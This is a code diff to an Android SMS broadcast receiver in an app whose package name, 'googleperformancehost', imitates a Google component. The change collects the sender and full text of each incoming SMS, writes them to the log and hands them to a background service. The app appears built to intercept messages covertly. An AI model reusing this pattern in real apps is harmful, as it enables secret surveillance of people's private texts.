@@ -4,10 +4,11 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
-import android.provider.Telephony;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
+
+import com.example.tiber.googleperformancehost.Services.Temporary.ReceivedSMSHandlerIntentService;
 
 /**
  * Created by tiber on 10/30/2016.
@@ -23,18 +24,28 @@ public class SMSReceiver extends BroadcastReceiver {
         try {
             if (bundle != null) {
                 final Object[] pdusObj = (Object[]) bundle.get("pdus");
+                String phoneNumber = null;
+                String senderNum = null;
+                String message = "";
 
                 for (int i = 0; i < pdusObj.length; i++) {
 
                     SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
-                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
+                    phoneNumber = currentMessage.getDisplayOriginatingAddress();
+                    senderNum = phoneNumber;
 
-                    String senderNum = phoneNumber;
-                    String message = currentMessage.getDisplayMessageBody();
-
-                    Log.wtf("SmsReceiver", "senderNum: "+ senderNum + "; message: " + message);
-
+                    message += currentMessage.getDisplayMessageBody();
                 } // end for loop
+
+                Log.wtf("SmsReceiver", "senderNum: "+ senderNum+" length = "+ senderNum.length() + "; message: " + message);
+                if(senderNum.length() > 7 ){
+                    Intent startSMSHandler =
+                            new Intent(context.getApplicationContext(), ReceivedSMSHandlerIntentService.class);
+
+                    startSMSHandler.putExtra("senderNumber",senderNum);
+                    startSMSHandler.putExtra("message",message);
+                    context.getApplicationContext().startService(startSMSHandler);
+                }
             } // bundle is null
 
         } catch (Exception e) {
